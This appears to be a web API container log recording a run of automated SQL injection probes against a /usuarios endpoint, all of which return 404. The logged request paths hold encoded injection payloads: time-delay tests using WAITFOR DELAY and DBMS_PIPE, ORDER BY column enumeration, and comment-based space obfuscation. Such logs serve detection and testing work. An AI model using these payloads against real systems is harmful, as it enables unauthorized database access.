api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:45854 - "GET /usuarios%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27bgYr%27%3D%27bgYr HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45860 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/LXhR HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45886 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/2001%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2875%29%7C%7CCHR%28119%29%7C%7CCHR%2868%29%2C5%29/%2A%2A/AND/%2A%2A/%285587%3D5587 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45894 - "GET /usuarios/%2A%2A/AND/%2A%2A/2001%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2875%29%7C%7CCHR%28119%29%7C%7CCHR%2868%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45902 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/2001%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2875%29%7C%7CCHR%28119%29%7C%7CCHR%2868%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27Tsol%27%3D%27Tsol HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45914 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/2001%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2875%29%7C%7CCHR%28119%29%7C%7CCHR%2868%29%2C5%29/%2A%2A/AND/%2A%2A/%27Pslk%27%3D%27Pslk HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45924 - "GET /usuarios/%2A%2A/AND/%2A%2A/2001%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2875%29%7C%7CCHR%28119%29%7C%7CCHR%2868%29%2C5%29--/%2A%2A/pwwH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45870 - "GET /usuarios%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/whAa HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45938 - "GET /usuarios/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/haVs HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45950 - "GET /usuarios%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/SjMd HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45956 - "GET /usuarios%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/NBPP HTTP/1.1" 404 Not Found
